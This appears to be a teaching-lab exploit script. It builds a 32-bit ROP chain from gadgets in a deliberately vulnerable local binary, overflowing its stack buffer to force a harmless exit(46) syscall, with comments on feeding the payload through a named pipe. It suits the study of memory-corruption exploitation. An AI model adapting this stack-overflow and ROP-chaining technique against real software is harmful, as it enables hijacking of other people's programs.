import pathlib
from exploitsCommon import *


# In order to run this exploit:
# - Run in a terminal:
#     - mkfifo ./bin/mypipe
#     - cat ./bin/mypipe | ./bin/vulnerable32bit.exe fread ; echo Return code is $?
# - Run in another terminal:
#     - python3 ./exploits/payloadSyscallExit32.py && cat ./exploits/payloadSyscallExit32.dat > ./bin/mypipe
# - Go back to the first terminal and wait a few seconds.


if __name__ == "__main__":
    changeCWDToScriptDirectory()

    print('Scanning bytes...')
    instrSequences = getInstructionSequenceOutput('vulnerable32bit.exe')

    # The vulnerable executable will call `exit(returnCode)`;
    # We add some 0xFF "padding" so that there are no null bytes in this 4-byte value.
    # The extra bytes are ignored by `exit()` anyway.
    returnCode = 46
    returnCode = 0xFFffFF00 + returnCode

    payloadComponents = [
        # A "NOP" sled. Long enough to go over the stack buffer and cover the stored return address.
        getBytesOf32bitInstrSeqAddress(instrSequences, 'ret') * 40,

        # EBX = returnCode;
        getBytesOf32bitInstrSeqAddress(instrSequences, 'pop ebx; ret'),
        (returnCode).to_bytes(4, 'little'),

        # EAX = 1; (system call number for `exit();`)
        getBytesOf32bitInstrSeqAddress(instrSequences, 'xor eax, eax; ret'),
        getBytesOf32bitInstrSeqAddress(instrSequences, 'inc eax; ret'),

        # Make a system call. In our case, call `exit(EBX);`
        getBytesOf32bitInstrSeqAddress(instrSequences, 'int 0x80; ret'),
    ]

    payload = b''.join(payloadComponents)
    print(f"payload = {payload.hex()}")

    scriptFileNameWithoutExtension = pathlib.Path(__file__).stem
    with open(f'{scriptFileNameWithoutExtension}.dat', 'wb') as fout:
        fout.write(payload)
